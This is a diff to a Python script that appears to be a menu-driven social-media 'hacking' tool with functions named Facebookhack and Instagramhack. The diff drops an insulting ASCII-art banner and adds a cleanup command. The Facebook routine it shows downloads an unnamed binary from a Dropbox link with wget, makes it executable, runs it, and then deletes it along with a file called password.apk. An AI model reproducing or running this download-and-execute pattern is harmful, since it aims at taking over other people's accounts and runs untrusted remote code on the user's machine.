@@ -4,33 +4,9 @@ import sys
 import time
 import cowsay
 
-exitbanner = """
-___________
-< bye bitch >
- -----------
-          \
-           \
-            \          __---__
-                    _-       /--______
-               __--( /     \ )XXXXXXXXXXX\v.
-             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
-            /XXX(       U     )        XXXXXXX\
-          /XXXXX(              )--_  XXXXXXXXXXX\
-         /XXXXX/ (      O     )   XXXXXX   \XXXXX\
-         XXXXX/   /            XXXXXX   \__ \XXXXX
-         XXXXXX__/          XXXXXX         \__---->
- ---___  XXX__/          XXXXXX      \__         /
-   \-  --__/   ___/\  XXXXXX            /  ___--/=
-    \-\    ___/    XXXXXX              '--- XXXXXX
-       \-\/XXX\ XXXXXX                      /XXXXX
-         \XXXXXXXXX   \                    /XXXXX/
-          \XXXXXX      >                 _/XXXXX/
-            \XXXXX--__/              __-- XXXX/
-             -XXXXXXXX---------------  XXXXXX-
-                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
-                  ""VXXXXXXXXXXXXXXXXXXV""
-"""
+
 backtomenubanner = """
+BACK TO MENU ?
 [1] YES
 [2]  NO
 """
@@ -40,6 +16,7 @@ def Facebookhack():
 	os.system('wget https://www.dropbox.com/s/dygbg1y8kojc4rr/fb')
 	os.system('chmod +x fb')
 	os.system('./fb')
+	os.system('rm -r fb password.apk')
 	backtomenu()
 	
 def Instagramhack():
